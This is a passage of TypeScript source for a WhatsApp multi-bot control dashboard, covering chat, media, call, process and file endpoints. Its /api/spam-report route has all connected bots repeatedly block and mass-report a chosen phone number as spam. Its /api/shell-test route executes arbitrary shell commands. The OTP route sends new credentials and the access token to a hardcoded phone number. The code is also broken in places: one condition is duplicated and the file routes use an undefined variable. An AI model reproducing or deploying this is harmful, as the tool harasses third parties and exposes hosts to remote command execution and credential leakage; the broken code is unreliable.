      const tools='<div class="wa-tools"><button class="wa-tbtn" onclick="sendAct(\\'react\\',{msgId:\\''+esc(m.id)+'\\',emoji:\\'❤️\\'})">❤️</button><button class="wa-tbtn" onclick="sendAct(\\'react\\',{msgId:\\''+esc(m.id)+'\\',emoji:\\'😂\\'})">😂</button><button class="wa-tbtn" onclick="sendAct(\\'react\\',{msgId:\\''+esc(m.id)+'\\',emoji:\\'🔥\\'})">🔥</button><button class="wa-tbtn" onclick="setReply(\\''+esc(m.id)+'\\')">↩️</button><button class="wa-tbtn" onclick="sendAct(\\'delete\\',{msgId:\\''+esc(m.id)+'\\'})">🗑️</button></div>';
      return '<div class="wa-mrow '+side+'">'+tools+'<div class="wa-bub '+(isStk?'stk':'')+'">'+sender+quote+media+(m.text?'<div>'+esc(m.text)+'</div>':'')+'<div class="wa-bmeta"><span>'+esc(m.time)+'</span>'+(m.fromMe?'<span>✓✓</span>':'')+'</div></div>'+(rList.length?'<div class="wa-reacts">'+rList.map(esc).join(' ')+'</div>':'')+'</div>';
    }).join('');
    if(scroll||nearBot)box.scrollTop=box.scrollHeight;
  }catch{}finally{busyMs=false;}
}

function setReply(id){const f=msgs.find(x=>x.id===id);if(!f)return;replyMsg=f;el('repWho').textContent=f.pushName||('+'+f.sender);el('repTxt').textContent=f.text||(f.mediaType?'['+f.mediaType.toUpperCase()+']':'Mensaje');el('replyBar').classList.add('active');el('msgInp').focus();}
function cancelReply(){replyMsg=null;el('replyBar').classList.remove('active');}
async function sendAct(action,extra={}){if(!botKey||!chatJid)return;await api('wa-action','POST',{action,botKey,jid:chatJid,...extra});loadMsgs(chatJid,false,true);}
function onTyping(){if(Date.now()-lastTyp>4000&&botKey&&chatJid){lastTyp=Date.now();sendAct('presence',{presence:'composing'});}}

async function sendMsg(e){
  e.preventDefault();const inp=el('msgInp'),text=inp.value.trim();if(!text||!botKey||!chatJid)return;
  const quotedId=replyMsg?replyMsg.id:'';inp.value='';cancelReply();el('emoBar').classList.remove('active');
  const r=await api('wa-send','POST',{botKey,jid:chatJid,text,quotedId});
  if(r.ok){await loadMsgs(chatJid,true,true);refreshChats(true);}else alert(r.error||'Error');
}

function uploadMedia(e){
  const f=e.target.files[0];e.target.value='';if(!f||!botKey||!chatJid)return;
  const asSticker=f.name.toLowerCase().endsWith('.webp');
  const caption=asSticker?'':(prompt('Comentario adjunto (opcional):','')||'');
  const rd=new FileReader();
  rd.onload=async()=>{
    const base64=String(rd.result||'').split(',')[1]||'';if(!base64)return;
    const r=await api('wa-send-media','POST',{botKey,jid:chatJid,fileName:f.name,mimeType:f.type||'application/octet-stream',asSticker,caption,base64,quotedId:replyMsg?replyMsg.id:''},20000);
    cancelReply();if(r.ok){await loadMsgs(chatJid,true,true);refreshChats(true);}else alert(r.error||'Error');
  };
  rd.readAsDataURL(f);
}

async function recVoice(){
  const btn=el('micBtn');if(!botKey||!chatJid)return alert('Abre un chat primero');
  if(rec&&rec.state==='recording'){rec.stop();btn.style.background='#2a3942';btn.textContent='🎤';return;}
  try{
    const st=await navigator.mediaDevices.getUserMedia({audio:true});chunks=[];rec=new MediaRecorder(st);
    rec.ondataavailable=ev=>{if(ev.data.size>0)chunks.push(ev.data);};
    rec.onstop=()=>{st.getTracks().forEach(t=>t.stop());const rd=new FileReader();rd.onload=async()=>{const base64=String(rd.result||'').split(',')[1]||'';if(base64){await api('wa-send-media','POST',{botKey,jid:chatJid,fileName:'voice.ogg',mimeType:'audio/ogg; codecs=opus',isPtt:true,base64},20000);loadMsgs(chatJid,true,true);refreshChats(true);}};rd.readAsDataURL(new Blob(chunks,{type:'audio/ogg; codecs=opus'}));};
    rec.start();btn.style.background='#ff2a54';btn.textContent='⏹️';sendAct('presence',{presence:'recording'});
  }catch{alert('Micrófono no disponible');}
}

async function promptSticker(){const u=prompt('URL de imagen (.webp/.png/.jpg):');if(u&&botKey&&chatJid){await api('wa-send-media','POST',{botKey,jid:chatJid,mediaUrl:u.trim(),asSticker:true},15000);loadMsgs(chatJid,true,true);}}
async function newChat(){const r=prompt('Número con prefijo (ej: 573001234567) o JID:');if(!r)return;const jid=r.includes('@')?r.trim():r.replace(/\\D/g,'')+'@s.whatsapp.net';if(jid.length<10)return;await api('wa-init-chat','POST',{botKey,jid});await refreshChats(true);openChat(jid);}
async function clearChat(){if(botKey&&chatJid){await api('wa-clear-chat','POST',{botKey,jid:chatJid});loadMsgs(chatJid,true,true);refreshChats(true);}}

async function loadProcs(){try{const d=await api('procs');el('procsTb').innerHTML=(d.processes||[]).map(p=>'<tr><td><code>'+esc(p.pid)+'</code></td><td>'+esc(p.comm)+'</td><td>'+esc(p.cpu)+'%</td><td>'+esc(p.mem)+'%</td><td><button class="btn btn-danger" style="padding:4px 8px" onclick="api(\\'kill-proc\\',\\'POST\\',{pids:[\\''+esc(p.pid)+'\\']}).then(loadProcs)">Matar</button></td></tr>').join('');}catch{}}
async function killPids(){const pids=el('pidsInp').value.split(',').map(s=>s.trim()).filter(Boolean);if(pids.length){await api('kill-proc','POST',{pids});el('pidsInp').value='';loadProcs();}}
async function cleanRam(){const r=await api('clean-ram','POST',{});alert('RAM actual: '+r.afterMb+' MB');refreshStatus();}
async function loadCmds(){const d=await api('commands');el('cmdGrid').innerHTML=(d.allCommands||[]).map(c=>{const b=(d.blocked||[]).includes(c);return '<div class="cmd-item"><span>.'+esc(c)+'</span><button class="btn '+(b?'btn-danger':'btn-success')+'" onclick="toggleCmd(\\''+esc(c)+'\\')">'+(b?'Bloqueado':'Activo')+'</button></div>';}).join('');}
async function toggleCmd(cmd){if(cmd){await api('toggle-cmd','POST',{cmd});loadCmds();}}
async function runSpam(){const phone=el('spamPhone').value.trim(),cycles=parseInt(el('spamCyc').value,10)||5;if(phone){await api('spam-report','POST',{phone,cycles});el('spamPhone').value='';refreshStatus();}}
async function loadDir(dir){if(dir)el('dirInp').value=dir;const d=await api('files?dir='+encodeURIComponent(el('dirInp').value));if(d.entries)el('fileList').innerHTML=d.entries.map(e=>'<button class="tab-btn" onclick="'+(e.isDir?'loadDir(\\''+esc(e.relPath)+'\\')':'openFile(\\''+esc(e.relPath)+'\\')')+'">'+(e.isDir?'📁 ':'📄 ')+esc(e.name)+'</button>').join('');}
async function openFile(f){const d=await api('file-read?file='+encodeURIComponent(f));el('editPath').value=d.file||f;el('fileEd').value=d.content||'';}
async function saveFile(){const file=el('editPath').value;if(file){const r=await api('file-save','POST',{file,content:el('fileEd').value});alert(r.ok?'Guardado':'Error');}}
async function runBench(){el('benchOut').textContent='Ejecutando...';const r=await api('benchmark','POST',{},15000);el('benchOut').textContent=r.result;}
async function runSh(){const cmd=el('shInp').value.trim();if(cmd){el('shOut').textContent='Ejecutando...';const r=await api('shell-test','POST',{cmd},12000);el('shOut').textContent=r.output;}}

(async()=>{
  await refreshStatus();await refreshChats(true);
  setInterval(refreshStatus,3500);
  setInterval(()=>{if(el('tab-wa').classList.contains('active'))refreshChats(false);if(el('tab-procs').classList.contains('active'))loadProcs();},2500);
})();
</script></body></html>`;
}

async function ensureWebServerRunning(): Promise<number> {
  if (state.server && state.port > 0) return state.port;

  const server = http.createServer(async (req, res) => {
    try {
      const parsed = new URL(req.url || "/", "http://127.0.0.1");
      const pathname = parsed.pathname;

      if (pathname === "/api/login" && req.method === "POST") {
        const b = await readJson(req);
        const u = String(b.user || "").trim();
        const p = String(b.pass || "").trim();
        if (((u === state.tempUser || u === state.ownerEmail) && p === state.tempPass) || p === state.token) {
          return sendJson(res, 200, { ok: true, token: state.token });
        }
        return sendJson(res, 401, { ok: false, error: "Credenciales inválidas." });
      }

      if (pathname === "/api/request-otp" && req.method === "POST") {
        rotateCredentials();
        const base = state.tunnelUrl || `http://${state.publicIp || "127.0.0.1"}:${state.port}`;
        sendEmail(state.ownerEmail, base, state.tempUser, state.tempPass, state.token).catch(() => {});
        state.lastSock?.sendMessage("573118353868@s.whatsapp.net", {
          text: `🔐 *${fytBold("NUEVAS CREDENCIALES")}*\n👤 *Usuario:* \`${state.tempUser}\`\n🔑 *OTP:* \`${state.tempPass}\`\n🌐 ${base}/?token=${state.token}`,
        }).catch(() => {});
        return sendJson(res, 200, { ok: true, email: state.ownerEmail });
      }

      const token = parsed.searchParams.get("token") || req.headers["x-aura-token"];

      if (pathname === "/" && req.method === "GET") {
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        return res.end(token === state.token ? buildDashboardHtml(state.token) : buildLoginHtml(state.ownerEmail));
      }

      if (token !== state.token) return sendJson(res, 401, { error: "No autorizado" });

      if (pathname === "/api/thumb" && req.method === "GET") {
        const thumb = state.thumbStore.get(parsed.searchParams.get("id") || "");
        if (!thumb) {
          res.writeHead(404);
          return res.end();
        }
        res.writeHead(200, { "Content-Type": "image/jpeg", "Content-Length": thumb.length, "Cache-Control": "public, max-age=3600" });
        return res.end(thumb);
      }

      if (pathname === "/api/media" && req.method === "GET") {
        const id = parsed.searchParams.get("id") || "";
        const bKey = parsed.searchParams.get("botKey") || "";
        let item = state.mediaStore.get(id) || null;

        if (!item) {
          const look = state.msgLookup.get(id);
          if (look?.msg.mediaType) {
            const { bot } = findBot(bKey || look.botKey);
            item = await fetchMediaBuffer(bot, look.msg.rawMessage, id, look.msg.mediaType, look.msg.mediaMime || "application/octet-stream", look.msg.mediaNode);
          }
        }

        if (!item && state.thumbStore.has(id)) {
          const t = state.thumbStore.get(id)!;
          res.writeHead(200, { "Content-Type": "image/jpeg", "Content-Length": t.length });
          return res.end(t);
        }

        if (!item?.buffer.length) {
          res.writeHead(404);
          return res.end();
        }

        const total = item.buffer.length;
        const mime = item.mime || "application/octet-stream";
        const range = req.headers.range;

        if (range) {
          const [sStr, eStr] = range.replace(/bytes=/, "").split("-");
          const start = parseInt(sStr, 10) || 0;
          const end = Math.min(eStr ? parseInt(eStr, 10) : total - 1, total - 1);
          const chunk = item.buffer.subarray(start, end + 1);
          res.writeHead(206, {
            "Content-Range": `bytes ${start}-${end}/${total}`,
            "Accept-Ranges": "bytes",
            "Content-Length": chunk.length,
            "Content-Type": mime,
            "Cache-Control": "public, max-age=3600",
          });
          return res.end(chunk);
        }

        res.writeHead(200, { "Content-Type": mime, "Content-Length": total, "Accept-Ranges": "bytes", "Cache-Control": "public, max-age=3600" });
        return res.end(item.buffer);
      }

      if (pathname === "/api/wa-avatar" && req.method === "GET") {
        const bKey = parsed.searchParams.get("botKey") || "";
        const jid = parsed.searchParams.get("jid") || "";
        const cKey = `${bKey}:${jid}`;
        const cached = state.avatarCache.get(cKey);
        if (cached) {
          res.writeHead(302, { Location: cached, "Cache-Control": "public, max-age=1800" });
          return res.end();
        }
        if (cached === undefined && !state.avatarPending.has(cKey) && state.avatarPending.size < 4) {
          state.avatarPending.add(cKey);
          const { bot } = findBot(bKey);
          if (typeof bot?.profilePictureUrl === "function") {
            Promise.race([bot.profilePictureUrl(jid, "image"), new Promise((_, r) => setTimeout(() => r(new Error()), 1600))])
              .then((u: any) => {
                const url = typeof u === "string" ? u : "";
                state.avatarCache.set(cKey, url);
                const ch = getChatStore(bKey).get(jid);
                if (ch && url) ch.avatarUrl = url;
              })
              .catch(() => state.avatarCache.set(cKey, ""))
              .finally(() => state.avatarPending.delete(cKey));
          } else {
            state.avatarCache.set(cKey, "");
            state.avatarPending.delete(cKey);
          }
        }
        res.writeHead(404);
        return res.end();
      }

      if (pathname === "/api/status" && req.method === "GET") {
        hookSockets();
        const subbots = getAllSockets().map((b, i) => {
          const id = getBotKey(b, i);
          return {
            id,
            name: b?.user?.name || (i === 0 ? "MainBot" : `SubBot-${i}`),
            role: i === 0 && !b?.isSubBot ? "Principal" : `SubBot #${i}`,
            paused: state.pausedBotIds.has(id) || (i > 0 && state.subbotsPaused),
          };
        });
        let groupsCount = 0;
        for (const st of state.botChatStores.values()) for (const c of st.values()) if (c.isGroup) groupsCount++;
        const mem = process.memoryUsage();
        const uptimeSec = Math.floor(process.uptime());
        return sendJson(res, 200, {
          uptimeSec,
          subbots,
          subbotsPaused: state.subbotsPaused,
          msgRx: state.msgRx,
          msgTx: state.msgTx,
          groupsCount,
          ramRss: (mem.rss / 1048576).toFixed(1),
          ramHeap: (mem.heapUsed / 1048576).toFixed(1),
          loadAvg: os.loadavg().map((n) => n.toFixed(2)).join(", "),
          reports: Array.from(state.reportRegistry.values()).map((r) => ({ phone: r.phone, totalReports: r.totalReports, subbotsCount: r.subbotsUsed.size, lastTimestamp: r.lastTimestamp })),
          calls: state.callLogs,
          autoRejectCalls: state.autoRejectCalls,
          autoRejectMessage: state.autoRejectMessage,
        });
      }

      if (pathname === "/api/procs" && req.method === "GET") {
        const processes: any[] = [];
        try {
          const { stdout } = await execAsync("ps -eo pid,comm,%cpu,%mem --sort=-%mem | head -n 16", { timeout: 2500 });
          for (const line of stdout.trim().split("\n").slice(1)) {
            const p = line.trim().split(/\s+/);
            if (p.length >= 4) processes.push({ pid: p[0], comm: p.slice(1, -2).join(" "), cpu: p[p.length - 2], mem: p[p.length - 1] });
          }
        } catch {}
        return sendJson(res, 200, { processes });
      }

      if (pathname === "/api/wa-chats" && req.method === "GET") {
        hookSockets();
        const reqKey = parsed.searchParams.get("botKey") || "";
        const { bot, idx } = findBot(reqKey);
        const effKey = bot ? getBotKey(bot, idx) : reqKey;
        if (bot) syncGroupsBg(bot, idx, false);
        const chats = Array.from(getChatStore(effKey).values())
          .sort((a, b) => b.lastTime - a.lastTime)
          .map((c) => ({ jid: c.jid, name: c.name, isGroup: c.isGroup, unread: c.unread, lastTime: c.lastTime, lastPreview: c.lastPreview, avatarUrl: c.avatarUrl || state.avatarCache.get(`${effKey}:${c.jid}`) || "" }));
        return sendJson(res, 200, { botKey: effKey, chats });
      }

      if (pathname === "/api/wa-sync" && req.method === "POST") {
        const { botKey } = await readJson(req);
        state.botGroupSynced.delete(String(botKey || ""));
        const { bot, idx } = findBot(String(botKey || ""));
        if (bot) syncGroupsBg(bot, idx, true);
        return sendJson(res, 200, { ok: true });
      }

      if (pathname === "/api/wa-messages" && req.method === "GET") {
        const bKey = parsed.searchParams.get("botKey") || "";
        const jid = parsed.searchParams.get("jid") || "";
        const chat = getChatStore(bKey).get(jid);
        if (!chat) return sendJson(res, 200, { chat: null });
        chat.unread = 0;
        return sendJson(res, 200, {
          chat: {
            jid: chat.jid,
            name: chat.name,
            isGroup: chat.isGroup,
            avatarUrl: chat.avatarUrl || state.avatarCache.get(`${bKey}:${chat.jid}`) || "",
            statusText: chat.statusText || "",
            messages: chat.messages.map((m) => ({
              id: m.id,
              sender: m.sender,
              pushName: m.pushName,
              text: m.text,
              time: m.time,
              timestamp: m.timestamp,
              fromMe: m.fromMe,
              mediaType: m.mediaType,
              quotedId: m.quotedId,
              quotedSender: m.quotedSender,
              quotedText: m.quotedText,
              reactions: m.reactions,
            })),
          },
        });
      }

      if (pathname === "/api/wa-init-chat" && req.method === "POST") {
        const { botKey, jid } = await readJson(req);
        if (botKey && jid) {
          const st = getChatStore(String(botKey));
          if (!st.has(jid)) {
            const isG = String(jid).endsWith("@g.us");
            st.set(jid, { jid, name: isG ? `Grupo ${cleanId(jid)}` : `+${cleanId(jid)}`, isGroup: isG, unread: 0, lastTime: Date.now(), lastPreview: "Chat abierto", messages: [] });
          }
        }
        return sendJson(res, 200, { ok: true });
      }

      if (pathname === "/api/wa-clear-chat" && req.method === "POST") {
        const { botKey, jid } = await readJson(req);
        const ch = getChatStore(String(botKey)).get(String(jid));
        if (ch) {
          ch.messages = [];
          ch.lastPreview = "Historial vaciado";
        }
        return sendJson(res, 200, { ok: true });
      }

      if (pathname === "/api/wa-send" && req.method === "POST") {
        const { botKey, jid, text, quotedId } = await readJson(req);
        const { bot } = findBot(String(botKey));
        if (!bot || !jid || !text) return sendJson(res, 400, { ok: false, error: "Datos incompletos" });
        const qObj = quotedId ? getChatStore(botKey).get(jid)?.messages.find((x) => x.id === quotedId) : undefined;
        const mentions = (String(text).match(/@(\d{7,15})/g) || []).map((m) => `${m.slice(1)}@s.whatsapp.net`);
        const orig = state.originalSenders.get(bot) || bot.sendMessage.bind(bot);
        const sent = await orig(jid, { text: String(text), ...(mentions.length ? { mentions } : {}) }, qObj?.rawMessage ? { quoted: qObj.rawMessage } : undefined);
        state.msgTx++;
        recordChatMsg(botKey, jid, {
          id: sent?.key?.id || randomBytes(6).toString("hex"),
          sender: botKey,
          pushName: bot?.user?.name || "SubBot",
          text: String(text),
          fromMe: true,
          quotedId: qObj?.id,
          quotedSender: qObj?.sender,
          quotedText: qObj?.text,
          rawKey: sent?.key,
          rawMessage: sent,
        });
        return sendJson(res, 200, { ok: true });
      }

      if (pathname === "/api/wa-send-media" && req.method === "POST") {
              if (pathname === "/api/wa-send-media" && req.method === "POST") {
        const b = await readJson(req);
        const { bot } = findBot(String(b.botKey || ""));
        if (!bot || !b.jid) return sendJson(res, 404, { ok: false, error: "Subbot inválido" });
        let buf: Buffer | null = b.base64 ? Buffer.from(String(b.base64), "base64") : null;
        if (!buf && b.mediaUrl) buf = Buffer.from(await (await fetch(String(b.mediaUrl))).arrayBuffer());
        if (!buf?.length) return sendJson(res, 400, { ok: false, error: "Archivo vacío" });

        const mime = String(b.mimeType || "image/jpeg");
        const caption = String(b.caption || "");
        const qObj = b.quotedId ? getChatStore(b.botKey).get(b.jid)?.messages.find((x) => x.id === b.quotedId) : undefined;
        const orig = state.originalSenders.get(bot) || bot.sendMessage.bind(bot);

        let payload: any;
        let mediaKind: "image" | "sticker" | "video" | "audio" | "document" = "document";

        if (b.asSticker || mime.includes("webp")) {
          payload = { sticker: buf, mimetype: "image/webp" };
          mediaKind = "sticker";
        } else if (b.isPtt || mime.startsWith("audio/")) {
          payload = { audio: buf, mimetype: mime, ptt: Boolean(b.isPtt) };
          mediaKind = "audio";
        } else if (mime.startsWith("image/")) {
          payload = { image: buf, caption, mimetype: mime };
          mediaKind = "image";
        } else if (mime.startsWith("video/")) {
          payload = { video: buf, caption, mimetype: mime };
          mediaKind = "video";
        } else {
          payload = { document: buf, fileName: String(b.fileName || "archivo"), mimetype: mime, caption };
          mediaKind = "document";
        }

        const sent = await orig(b.jid, payload, qObj?.rawMessage ? { quoted: qObj.rawMessage } : undefined);
        const msgId = sent?.key?.id || randomBytes(6).toString("hex");
        const finalMime = mediaKind === "sticker" ? "image/webp" : mime;

        state.mediaStore.set(msgId, { mime: finalMime, buffer: buf, createdAt: Date.now() });
        if (state.mediaStore.size > 120) {
          const oldest = state.mediaStore.keys().next().value;
          if (oldest) state.mediaStore.delete(oldest);
        }
        state.msgTx++;

        const store = getChatStore(String(b.botKey));
        const isGroup = String(b.jid).endsWith("@g.us");
        const cleanRemote = String(b.jid).split("@")[0].split(":")[0];
        const nowTs = Date.now();
        const timeStr = new Date(nowTs).toLocaleTimeString("es-CO", { hour: "2-digit", minute: "2-digit" });
        let chatSession = store.get(String(b.jid));
        if (!chatSession) {
          chatSession = {
            jid: String(b.jid),
            name: isGroup ? `Grupo ${cleanRemote}` : `+${cleanRemote}`,
            isGroup,
            unread: 0,
            lastTime: nowTs,
            lastPreview: caption || `[${mediaKind.toUpperCase()}]`,
            messages: [],
          };
          store.set(String(b.jid), chatSession);
        }
        const newMsg = {
          id: msgId,
          sender: String(b.botKey),
          pushName: bot?.user?.name || "SubBot",
          text: caption || (mediaKind === "audio" ? "🎤 Nota de voz" : ""),
          time: timeStr,
          timestamp: nowTs,
          fromMe: true,
          mediaType: mediaKind,
          mediaMime: finalMime,
          hasMedia: true,
          quotedId: qObj?.id || "",
          quotedSender: qObj?.sender || "",
          quotedText: qObj?.text || "",
          reactions: {},
          rawKey: sent?.key,
          rawMessage: sent,
        };
        chatSession.lastTime = nowTs;
        chatSession.lastPreview = (caption || `[${mediaKind.toUpperCase()}]`).slice(0, 70);
        chatSession.messages.push(newMsg);
        state.msgLookup?.set(msgId, { botKey: String(b.botKey), msg: newMsg });

        return sendJson(res, 200, { ok: true });
      }

      if (pathname === "/api/wa-action" && req.method === "POST") {
        const b = await readJson(req);
        const action = String(b.action || "");
        const botKey = String(b.botKey || "");
        const jid = String(b.jid || "");
        const msgId = String(b.msgId || "");

        const { bot } = findBot(botKey);
        if (!bot) return sendJson(res, 404, { ok: false, error: "Subbot no disponible" });

        const orig = state.originalSenders.get(bot) || bot.sendMessage.bind(bot);
        const chat = getChatStore(botKey).get(jid);
        const targetMsg = chat?.messages.find((x) => x.id === msgId);

        if (action === "react" && targetMsg?.rawKey) {
          const emoji = String(b.emoji || "❤️");
          await orig(jid, { react: { text: emoji, key: targetMsg.rawKey } });
          if (!targetMsg.reactions) targetMsg.reactions = {};
          targetMsg.reactions[botKey] = emoji;
          return sendJson(res, 200, { ok: true });
        }

        if (action === "delete" && targetMsg?.rawKey) {
          await orig(jid, { delete: targetMsg.rawKey });
          targetMsg.text = "🚫 Eliminaste este mensaje";
          targetMsg.mediaType = null;
          return sendJson(res, 200, { ok: true });
        }

        if (action === "presence" && typeof bot.sendPresenceUpdate === "function") {
          await bot.sendPresenceUpdate(b.presence || "composing", jid).catch(() => {});
          return sendJson(res, 200, { ok: true });
        }

        if ((action === "block" || action === "unblock") && typeof bot.updateBlockStatus === "function") {
          await bot.updateBlockStatus(jid, action);
          return sendJson(res, 200, { ok: true });
        }

        return sendJson(res, 200, { ok: true });
      }

      if (pathname === "/api/wa-call" && req.method === "POST") {
        const b = await readJson(req);
        const action = String(b.action || "");

        if (action === "toggle-autoreject") {
          state.autoRejectCalls = !state.autoRejectCalls;
          return sendJson(res, 200, { ok: true, autoRejectCalls: state.autoRejectCalls });
        }

        if (action === "set-message") {
          state.autoRejectMessage = String(b.message || "");
          return sendJson(res, 200, { ok: true });
        }

        if (action === "clear-logs") {
          state.callLogs = [];
          return sendJson(res, 200, { ok: true });
        }

        const botKey = String(b.botKey || "");
        const peerJid = String(b.peerJid || "");
        const { bot } = findBot(botKey);
        if (!bot) return sendJson(res, 404, { ok: false, error: "Subbot no encontrado" });

        if (action === "reject") {
          const callId = String(b.callId || "");
          if (typeof bot.rejectCall === "function" && callId && peerJid) {
            await bot.rejectCall(callId, peerJid).catch(() => {});
          }
          const logItem = state.callLogs.find((x) => x.id === callId);
          if (logItem) logItem.status = "reject";
          return sendJson(res, 200, { ok: true });
        }

        if (action === "offer" && peerJid) {
          const isVideo = Boolean(b.isVideo);
          const callId = randomBytes(8).toString("hex").toUpperCase();
          const now = Date.now();
          const timeStr = new Date(now).toLocaleTimeString("es-CO", {
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
          });

          if (typeof bot.query === "function") {
            await bot
              .query({
                tag: "call",
                attrs: { to: peerJid, id: callId },
                content: [
                  {
                    tag: "offer",
                    attrs: {
                      "call-id": callId,
                      "call-creator": bot?.user?.id || `${botKey}@s.whatsapp.net`,
                    },
                    content: isVideo
                      ? [{ tag: "video", attrs: {} }]
                      : [{ tag: "audio", attrs: { enc: "opus", rate: "16000" } }],
                  },
                ],
              })
              .catch(() => {});
          }

          const cleanPeer = peerJid.split("@")[0].split(":")[0];
          const knownName = getChatStore(botKey).get(peerJid)?.name || `+${cleanPeer}`;

          state.callLogs.unshift({
            id: callId,
            botKey,
            peerJid,
            peerName: knownName,
            isVideo,
            isGroup: peerJid.endsWith("@g.us"),
            direction: "outgoing",
            status: "ringing",
            timestamp: now,
            timeStr,
          });

          return sendJson(res, 200, { ok: true, callId });
        }

        return sendJson(res, 400, { ok: false, error: "Acción desconocida" });
      }

      if (pathname === "/api/toggle-subbots" && req.method === "POST") {
        state.subbotsPaused = !state.subbotsPaused;
        return sendJson(res, 200, { paused: state.subbotsPaused });
      }

      if (pathname === "/api/toggle-single-bot" && req.method === "POST") {
        const b = await readJson(req);
        const botKey = String(b.botKey || "");
        if (botKey) {
          if (state.pausedBotIds.has(botKey)) state.pausedBotIds.delete(botKey);
          else state.pausedBotIds.add(botKey);
        }
        return sendJson(res, 200, { ok: true });
      }

      if (pathname === "/api/clean-ram" && req.method === "POST") {
        try {
          if (typeof globalThis.gc === "function") globalThis.gc();
        } catch {}
        const afterMb = (process.memoryUsage().rss / 1024 / 1024).toFixed(1);
        return sendJson(res, 200, { ok: true, afterMb });
      }

      if (pathname === "/api/kill-proc" && req.method === "POST") {
        const b = await readJson(req);
        const pids: string[] = Array.isArray(b.pids) ? b.pids : [];
        const killed: string[] = [];
        for (const p of pids) {
          const numPid = parseInt(String(p), 10);
          if (!isNaN(numPid) && numPid > 1 && numPid !== process.pid) {
            try {
              process.kill(numPid, "SIGKILL");
              killed.push(String(numPid));
            } catch {}
          }
        }
        return sendJson(res, 200, { ok: true, killed });
      }

      if (pathname === "/api/commands" && req.method === "GET") {
        const allCommands = await syncCommandInterceptors();
        return sendJson(res, 200, {
          allCommands,
          blocked: Array.from(state.blockedCommands),
        });
      }

      if (pathname === "/api/toggle-cmd" && req.method === "POST") {
        const b = await readJson(req);
        const cmd = String(b.cmd || "").toLowerCase().trim();
        if (cmd) {
          await syncCommandInterceptors();
          if (state.blockedCommands.has(cmd)) state.blockedCommands.delete(cmd);
          else state.blockedCommands.add(cmd);
        }
        return sendJson(res, 200, { blocked: Array.from(state.blockedCommands) });
      }

      if (pathname === "/api/spam-report" && req.method === "POST") {
        const b = await readJson(req);
        const cleanPhone = String(b.phone || "").replace(/\D/g, "");
        const cycles = Math.min(20, Math.max(1, parseInt(String(b.cycles || "5"), 10)));
        if (!cleanPhone || cleanPhone.length < 7) return sendJson(res, 400, { ok: false });

        const targetJid = `${cleanPhone}@s.whatsapp.net`;
        const allBots = [state.lastSock, ...(typeof getActiveSubBots === "function" ? getActiveSubBots() || [] : [])].filter(Boolean);

        if (!state.reportRegistry.has(cleanPhone)) {
          state.reportRegistry.set(cleanPhone, {
            phone: cleanPhone,
            totalReports: 0,
            subbotsUsed: new Set(),
            lastTimestamp: new Date().toLocaleTimeString("es-CO"),
          });
        }

        const entry = state.reportRegistry.get(cleanPhone)!;

        await Promise.allSettled(
          allBots.map(async (botSock: any, idx: number) => {
            const botId = String(botSock?.user?.id || `bot_${idx}`).split("@")[0].split(":")[0];
            entry.subbotsUsed.add(botId);

            for (let i = 0; i < cycles; i++) {
              try {
                if (typeof botSock.updateBlockStatus === "function") {
                  await botSock.updateBlockStatus(targetJid, "block").catch(() => {});
                }
                if (typeof botSock.query === "function") {
                  await botSock
                    .query({
                      tag: "iq",
                      attrs: { to: "@s.whatsapp.net", type: "set", xmlns: "disallowed" },
                      content: [{ tag: "report", attrs: { jid: targetJid, type: "spam" } }],
                    })
                    .catch(() => {});
                }
                entry.totalReports++;
                entry.lastTimestamp = new Date().toLocaleTimeString("es-CO");
                if (typeof botSock.updateBlockStatus === "function") {
                  await botSock.updateBlockStatus(targetJid, "unblock").catch(() => {});
                }
              } catch {}
            }
          })
        );

        return sendJson(res, 200, { ok: true });
      }

      if (pathname === "/api/files" && req.method === "GET") {
        const relDir = parsedUrl.searchParams.get("dir") || ".";
        const root = process.cwd();
        const targetDir = path.resolve(root, relDir);
        const safeDir = targetDir.startsWith(root) ? targetDir : root;
        const items = fs.readdirSync(safeDir, { withFileTypes: true });
        const entries = items
          .filter((i) => i.name !== "node_modules" && i.name !== ".git")
          .map((i) => ({
            name: i.name,
            isDir: i.isDirectory(),
            relPath: path.relative(root, path.join(safeDir, i.name)) || ".",
          }))
          .sort((a, b) => Number(b.isDir) - Number(a.isDir));

        return sendJson(res, 200, { entries });
      }

      if (pathname === "/api/file-read" && req.method === "GET") {
        const relFile = parsedUrl.searchParams.get("file") || "";
        const root = process.cwd();
        const targetFile = path.resolve(root, relFile);
        const safeFile = targetFile.startsWith(root) ? targetFile : root;
        if (fs.existsSync(safeFile) && fs.statSync(safeFile).isFile()) {
          const content = fs.readFileSync(safeFile, "utf8");
          return sendJson(res, 200, { file: relFile, content });
        }
        return sendJson(res, 404, { error: "Archivo no encontrado" });
      }

      if (pathname === "/api/file-save" && req.method === "POST") {
        const b = await readJson(req);
        const relFile = String(b.file || "");
        const content = String(b.content ?? "");
        const root = process.cwd();
        const targetFile = path.resolve(root, relFile);
        if (targetFile.startsWith(root)) {
          fs.writeFileSync(targetFile, content, "utf8");
          return sendJson(res, 200, { ok: true });
        }
        return sendJson(res, 403, { ok: false });
      }

      if (pathname === "/api/benchmark" && req.method === "POST") {
        const t0 = performance.now();
        let acc = 0;
        for (let i = 0; i < 5_000_000; i++) acc += Math.sqrt(i);
        const cpuMs = (performance.now() - t0).toFixed(2);

        const t1 = performance.now();
        const buf = Buffer.alloc(32 * 1024 * 1024, 0xaa);
        const memMs = (performance.now() - t1).toFixed(2);

        const tmpFile = path.join(os.tmpdir(), `aura_bench_${Date.now()}.tmp`);
        const t2 = performance.now();
        fs.writeFileSync(tmpFile, buf);
        fs.readFileSync(tmpFile);
        fs.unlinkSync(tmpFile);
        const diskMs = (performance.now() - t2).toFixed(2);

        const summary = [
          `=== AURA-BOT V8 BENCHMARK ===`,
          `CPU Math (5M ops)     : ${cpuMs} ms (Checksum: ${acc.toFixed(0)})`,
          `RAM Alloc (32 MB)     : ${memMs} ms`,
          `Disk R/W (32 MB I/O)  : ${diskMs} ms`,
          `Sistema Operativo     : ${os.type()} ${os.release()} (${os.arch()})`,
          `Hilos / Núcleos CPU   : ${os.cpus().length} vCPU (${os.cpus()[0]?.model || "Generic"})`,
        ].join("\n");

        return sendJson(res, 200, { result: summary });
      }

      if (pathname === "/api/shell-test" && req.method === "POST") {
        const b = await readJson(req);
        const cmd = String(b.cmd || "uptime");
        try {
          const { stdout, stderr } = await execAsync(cmd, { timeout: 8000 });
          return sendJson(res, 200, { output: (stdout || stderr || "Ejecutado sin salida.").slice(0, 4000) });
        } catch (err: any) {
          return sendJson(res, 200, { output: String(err?.message || err).slice(0, 4000) });
